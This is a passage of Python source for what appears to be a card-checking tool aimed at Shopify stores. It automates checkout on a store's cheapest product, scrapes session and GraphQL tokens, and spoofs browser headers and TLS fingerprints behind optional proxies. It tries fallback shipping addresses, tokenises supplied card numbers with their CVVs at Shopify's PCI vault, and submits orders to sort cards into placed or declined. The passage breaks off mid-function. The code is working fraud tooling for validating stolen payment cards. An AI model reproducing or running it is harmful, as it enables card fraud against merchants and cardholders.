def extract_payment_method_id(proposal_body: str) -> str:
    match = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"\s*,\s*"name"\s*:\s*"shopify_payments"', proposal_body)
    return match.group(1) if match else ""

def extract_any_error(submit_body: str) -> str:
    for pattern in [
        r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
        r'"localizedMessage"\s*:\s*"([^"]+)"',
        r'"code"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
    ]:
        match = re.search(pattern, submit_body)
        if match:
            return match.group(1)
    return ""

def extract_submit_error(submit_body: str) -> str:
    match = re.search(r'"nonLocalizedMessage"\s*:\s*"([^"]+)"', submit_body)
    if match:
        return match.group(1)
    match = re.search(r'"code"\s*:\s*"([^"]+)"', submit_body)
    return match.group(1) if match else ""

def extract_receipt_status_code(poll_body: str, receipt_type: str) -> str:
    if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
        return "ORDER_PLACED"
    if receipt_type == "ProcessingReceipt":
        return "PROCESSING"
    match = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
    if match:
        code = match.group(1)
        if "CAPTCHA" in code:
            return "CARD_DECLINED"
        return code
    if "CAPTCHA" in poll_body:
        return "CARD_DECLINED"
    if receipt_type == "FailedReceipt":
        return "FAILED"
    return "UNKNOWN"

def detect_shipping_restriction(proposal_body: str) -> bool:
    """Return True if the proposal response indicates this address cannot receive shipping."""
    restriction_signals = [
        "SHIPPING_ADDRESS_UNDELIVERABLE",
        "no_delivery_options_available",
        "noDeliveryOptionsAvailable",
        "delivery is not available",
        "does not ship to",
    ]
    lower = proposal_body.lower()
    return any(s.lower() in lower for s in restriction_signals)

# ──────────────────────── Payload helpers ────────────────────────────

def patch_payload(payload: str, currency: str, country: str) -> str:
    if currency != "USD":
        payload = payload.replace('"currencyCode": "USD"',        f'"currencyCode": "{currency}"')
        payload = payload.replace('"presentmentCurrency": "USD"', f'"presentmentCurrency": "{currency}"')
    if country != "US":
        # Only patch buyerIdentity countryCode — leave billing/shipping address countryCode alone
        payload = payload.replace(
            '"presentmentCurrency": "USD",\n      "countryCode": "US"',
            f'"presentmentCurrency": "USD",\n      "countryCode": "{country}"'
        )
        payload = payload.replace('"phoneCountryCode": "US"', f'"phoneCountryCode": "{country}"')
    return payload

def generate_attempt_token(checkout_token: str) -> str:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return f"{checkout_token}-{''.join(random.choice(chars) for _ in range(10))}"

def generate_page_id() -> str:
    return f"{random.getrandbits(64):016x}"

# ──────────────────────── Step 9: PCI tokenisation ───────────────────

def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                     card_month: int, card_year: int, cvv: str,
                     shop_domain: str, proxy_url: str = "",
                     vault_url: str = "", vault_domain: str = "") -> Tuple[int, str]:

    _DEFAULT_VAULT = "https://checkout.pci.shopifyinc.com/sessions"
    endpoint     = vault_url or _DEFAULT_VAULT
    scope        = vault_domain or shop_domain
    origin_base  = endpoint.rsplit("/sessions", 1)[0] if "/sessions" in endpoint else "https://checkout.pci.shopifyinc.com"

    payload = json.dumps({
        "credit_card": {
            "number":             card_number,
            "month":              card_month,
            "year":               card_year,
            "verification_value": cvv,
            "start_month":        None,
            "start_year":         None,
            "issue_number":       "",
            "name":               card_name,
        },
        "payment_session_scope": scope,
    })

    headers = {
        "accept":               "application/json",
        "accept-language":      "en-US,en;q=0.9",
        "content-type":         "application/json",
        "origin":               origin_base,
        "priority":             "u=1, i",
        "referer":              f"{origin_base}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-ch-ua":            '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile":     "?0",
        "sec-ch-ua-platform":   '"Windows"',
        "sec-fetch-dest":       "empty",
        "sec-fetch-mode":       "cors",
        "sec-fetch-site":       "same-origin",
        "sec-fetch-storage-access": "active",
        "shopify-identification-signature": ident_sig,
        "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }

    with Session(impersonate="chrome124") as session:
        post_kwargs = {"data": payload, "headers": headers, "timeout": 30}
        if proxy_url:
            post_kwargs["proxy"] = proxy_url
        resp = session.post(endpoint, **post_kwargs)
    return resp.status_code, resp.text

# ──────────────────────── Proposal helpers ───────────────────────────

def _proposal_headers(shop_url: str, checkout_url: str, checkout_token: str,
                      session_token: str, build_id: str, source_token: str) -> Dict:
    return {
        "accept":                        "application/json",
        "accept-language":               "en-US",
        "content-type":                  "application/json",
        "origin":                        shop_url,
        "priority":                      "u=1, i",
        "referer":                       checkout_url,
        "sec-ch-ua":                     '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile":              "?0",
        "sec-ch-ua-platform":            '"Windows"',
        "sec-fetch-dest":                "empty",
        "sec-fetch-mode":                "cors",
        "sec-fetch-site":                "same-origin",
        "shopify-checkout-client":       "checkout-web/1.0",
        "shopify-checkout-source":       f'id="{checkout_token}", type="cn"',
        "user-agent":                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
        "x-checkout-one-session-token":  session_token,
        "x-checkout-web-build-id":       build_id,
        "x-checkout-web-deploy-stage":   "production",
        "x-checkout-web-server-handling":"fast",
        "x-checkout-web-server-rendering":"yes",
        "x-checkout-web-source-id":      source_token,
    }

# ──────────────────────── Step 4: Proposal 1 ─────────────────────────

def send_proposal(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                  session_token: str, stable_id: str, variant_id: str, price: str,
                  proposal_id: str, build_id: str, source_token: str,
                  currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": null,
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    print(resp.text)
    return resp.status_code, resp.text

# ──────────────────────── Step 5: Proposal 2 (email) ─────────────────

def send_proposal2(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    print(resp.text)
    return resp.status_code, resp.text

# ──────────────────────── Step 6: Proposal 3 (address) ───────────────

def send_proposal3(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, addr: Address, currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}",
          "address2": "{addr.address2}",
          "city": "{addr.city}",
          "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}",
          "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}",
          "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    print(resp.text)
    return resp.status_code, resp.text

# ──────────────────────── Step 10: SubmitForCompletion ───────────────

def send_poll_for_receipt(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                          session_token: str, build_id: str, source_token: str,
                          poll_id: str, receipt_id: str, receipt_session_token: str) -> Tuple[int, str]:

    params   = {
        "operationName": "PollForReceipt",
        "variables":     json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
        "id":            poll_id,
    }
    full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"

    headers  = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    headers["x-checkout-web-source-id"] = checkout_token  # poll uses checkout_token here

    resp = client.get(full_url, headers=headers)
    print(resp.text)
    return resp.status_code, resp.text


def send_submit_for_completion(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                               session_token: str, stable_id: str, variant_id: str, price: str,
                               submit_id: str, build_id: str, source_token: str, queue_token: str,
                               email: str, addr: Address, delivery_handle: str, shipping_amount: str,
                               total_amount: str, pci_session_id: str, attempt_token: str,
                               currency: str, country: str, signed_handles: List[str],
                               is_digital: bool = False,
                               item_amount: str = None,
                               tax_amount: str = None) -> Tuple[int, str]:

    handle_lines       = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
    signed_handles_json = "[" + ",".join(handle_lines) + "]"
    page_id            = generate_page_id()

    # payment totalAmount
    if is_digital:
        total_amount_block = '"totalAmount": {"any": true}'
    else:
        total_amount_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "{currency}"}}}}'

    # delivery block
    if is_digital:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["NONE"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
    else:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "destination": {{
            "streetAddress": {{
              "address1": "{addr.address1}",
              "address2": "{addr.address2}",
              "city": "{addr.city}",
              "countryCode": "{addr.country_code}",
              "postalCode": "{addr.postal_code}",
              "firstName": "{addr.first_name}",
              "lastName": "{addr.last_name}",
              "zoneCode": "{addr.zone_code}",
              "phone": "{addr.phone}",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyByHandle": {{
              "handle": "{delivery_handle}",
              "customDeliveryRate": false
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": false
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''

    tax_val   = tax_amount or "0.0"
    tax_block = f'"proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "{currency}"}}}}'

    gql_payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": "{session_token}"}},
      "queueToken": "{queue_token}",
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      {delivery_block},
      "merchandise": {{
        "merchandiseLines": [{{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
            }}
          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null, "lineComponents": []
        }}]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        {total_amount_block},
        "paymentLines": [{{
          "paymentMethod": {{
            "directPaymentMethod": {{
              "sessionId": "{pci_session_id}",
              "billingAddress": {{
                "streetAddress": {{
                  "address1": "{addr.address1}",
                  "address2": "{addr.address2}",
                  "city": "{addr.city}",
                  "countryCode": "{addr.country_code}",
                  "postalCode": "{addr.postal_code}",
                  "firstName": "{addr.first_name}",
                  "lastName": "{addr.last_name}",
                  "zoneCode": "{addr.zone_code}",
                  "phone": "{addr.phone}"
                }}
              }},
              "cardSource": null
            }},
            "giftCardPaymentMethod": null,
            "redeemablePaymentMethod": null,
            "walletPaymentMethod": null,
            "walletsPlatformPaymentMethod": null,
            "localPaymentMethod": null,
            "paymentOnDeliveryMethod": null,
            "paymentOnDeliveryMethod2": null,
            "manualPaymentMethod": null,
            "customPaymentMethod": null,
            "offsitePaymentMethod": null,
            "customOnsitePaymentMethod": null,
            "deferredPaymentMethod": null,
            "customerCreditCardPaymentMethod": null,
            "paypalBillingAgreementPaymentMethod": null,
            "remotePaymentInstrument": null
          }},
          "amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "{currency}"}}}}
        }}],
        "billingAddress": {{
          "streetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": "{email}",
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      "poNumber": null,
      "taxes": {{
        "proposedAllocations": null,
        {tax_block},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{
        "signature": null, "signatureUuid": null,
        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
      }},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{
      "requestUrl": "{checkout_url}",
      "pageId": "{page_id}"
    }}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    print(resp.text)
    return resp.status_code, resp.text

# ──────────────────────── Error checking ─────────────────────────────

def check_proposal_errors(step: str, status: int, body: str):
    if status != 200:
        print(f"  <tg-emoji emoji-id='4922679553744176307'>⚠</tg-emoji> {step}: HTTP {status}")
    matches = re.findall(
        r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"',
        body)
    if not matches:
        print(f"  <tg-emoji emoji-id='5289967092265660622'>✅</tg-emoji> {step}: No errors")
        return
    print(f"  <tg-emoji emoji-id='4922679553744176307'>⚠</tg-emoji> {step}: {len(matches)} error(s):")
    for i, (code, msg) in enumerate(matches):
        print(f"    [{i+1}] {code}" + (f" — {msg}" if msg else ""))

def check_submit_errors(status: int, body: str):
    if status != 200:
        print(f"  <tg-emoji emoji-id='4922679553744176307'>⚠</tg-emoji> SubmitForCompletion: HTTP {status}")
    match = re.search(r'"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"', body)
    if match:
        print(f"  Result: {match.group(1)}")
        if match.group(1) != "SubmitSuccess":
            for i, (code, msg) in enumerate(re.findall(
                r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"',
                body)):
                print(f"    [{i+1}] {code} — {msg}")

# ──────────────────────── Orchestrator ───────────────────────────────

def run_check(client: TLSClient, shop_url: str, site_name: str,
              email: str, card_number: str, card_month: int, card_year: int, card_cvv: str,
              proxy_url: str = "", currency: str = "USD", country: str = "US") -> CheckResult:

    result          = CheckResult(card=card_number, status=CheckStatus.ERROR)
    result.shop_url  = shop_url
    result.site_name = site_name
    result.currency  = currency

    # ── Brand pre-check: reject unsupported card types immediately ────
    _cn = card_number.replace(" ", "").replace("-", "")
    _is_discover = (
        _cn[:4] == "6011"
        or _cn[:2] == "65"
        or (len(_cn) >= 6 and 622126 <= int(_cn[:6]) <= 622925)
        or (len(_cn) >= 3 and 644 <= int(_cn[:3]) <= 649)
    )
    if _is_discover:
        result.status      = CheckStatus.DECLINED
        result.status_code = "Unsupported card brand: discover"
        result.error       = Exception("Unsupported card brand: discover")
        return result

    try:
        # ── Step 0: cheapest product ──────────────────────────────────
        try:
            title, product_id, variant_id, price = find_cheapest_product(client, shop_url)
            print(f"  Found product: {title} - ${price}")
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 0 failed: {e}")
            return result

        # ── Step 1: cart → checkout ───────────────────────────────────
        try:
            checkout_url, checkout_token, session_token, checkout_html = \
                add_to_cart_and_checkout(client, shop_url, variant_id)
            stable_id    = extract_stable_id(checkout_html)
            build_id     = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                raise Exception("missing stableId, buildId, or sourceToken")
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 1 failed: {e}")
            return result

        # ── Step 2: private access token ─────────────────────────────
        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if not pat_id:
                raise Exception("could not extract private_access_token id")
            fetch_private_access_token(client, shop_url, checkout_url, pat_id)
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 2 failed: {e}")
            return result

        # ── Step 3: actions JS → IDs ──────────────────────────────────
        try:
            actions_url = extract_actions_js_url(checkout_html, shop_url)
            if not actions_url:
                raise Exception("could not find actions JS URL")
            js_body     = fetch_actions_js(client, actions_url, shop_url)
            proposal_id = extract_proposal_id(js_body)
            submit_id   = extract_submit_for_completion_id(js_body)
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal or Submit ID")
            poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 3 failed: {e}")
            return result

        # ── Step 4: Proposal 1 ────────────────────────────────────────
        try:
            _, proposal_body = send_proposal(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token, currency, country)

            cur = extract_seller_currency(proposal_body)
            if cur and cur != currency:
                currency = cur
            ctr = extract_seller_country(proposal_body)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency

            if currency == "USD":
                seller_price = extract_seller_merchandise_price(proposal_body)
                if seller_price and seller_price != price:
                    price = seller_price

            queue_token = extract_queue_token(proposal_body)
            if not queue_token:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.error = Exception(f"Step 4 failed: {e}")
            return result

        # ── Step 5: Proposal 2 (email) ────────────────────────────────
        try:
            _, proposal2_body = send_proposal2(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token, email, currency, country)
            queue_token2 = extract_queue_token(proposal2_body)
            if not queue_token2:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.error = Exception(f"Step 5 failed: {e}")
            return result

        # ── Step 6: Proposal 3 (address) — with shipping fallback ─────
        # Try US first, then fall back to other countries if store doesn't ship to US
        addr              = address_for_country(country if country != "US" else "US")
        tried_countries   = [addr.country_code]
        fallback_addrs    = get_fallback_addresses(addr.country_code)
        fallback_idx      = 0
        final_proposal_body = None
        final_queue_token   = None

        try:
            for attempt in range(1 + len(fallback_addrs)):
                _, p3_body = send_proposal3(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_token,
                    queue_token2, email, addr, currency, country)

                q3 = extract_queue_token(p3_body)
                if not q3:
                    raise Exception("could not extract queueToken from proposal3")

                is_digital = not extract_is_shipping_required(p3_body)

                # For digital products, no shipping needed — skip fallback loop
                if is_digital:
                    print(f"  <tg-emoji emoji-id='5364098734600762220'>🎯</tg-emoji> Digital product — skipping shipping address negotiation")
                    final_proposal_body = p3_body
                    final_queue_token   = q3
                    break

                # Check if this address is rejected for shipping
                if detect_shipping_restriction(p3_body) and fallback_idx < len(fallback_addrs):
                    print(f"  <tg-emoji emoji-id='4922679553744176307'>⚠️</tg-emoji>  Store doesn't ship to {addr.country_code} — trying {fallback_addrs[fallback_idx].country_code}")
                    addr          = fallback_addrs[fallback_idx]
                    fallback_idx += 1
                    queue_token2  = q3  # advance queue token
                    continue

                # Address accepted — do one extra poll to get signed handles if needed
                signed_check = extract_signed_handles(p3_body)
                if not signed_check:
                    time.sleep(0.05)
                    _, p3_body2 = send_proposal3(
                        client, shop_url, checkout_url, checkout_token, session_token,
                        stable_id, variant_id, price, proposal_id, build_id, source_token,
                        q3, email, addr, currency, country)
                    q3      = extract_queue_token(p3_body2) or q3
                    p3_body = p3_body2

                final_proposal_body = p3_body
                final_queue_token   = q3
                break

            if not final_proposal_body:
                raise Exception(f"No shipping available after trying: {tried_countries + [a.country_code for a in fallback_addrs[:fallback_idx]]}")

        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 6 failed: {e}")
            return result

        # ── Step 9: PCI session ───────────────────────────────────────
        try:
            ident_sig    = extract_identification_signature(checkout_html)
            vault_url    = extract_vault_url(checkout_html)
            vault_domain = extract_vault_domain(checkout_html) or site_name
            if not ident_sig:
                raise Exception("could not extract identification signature")
            card_name_str = f"{addr.first_name} {addr.last_name}"
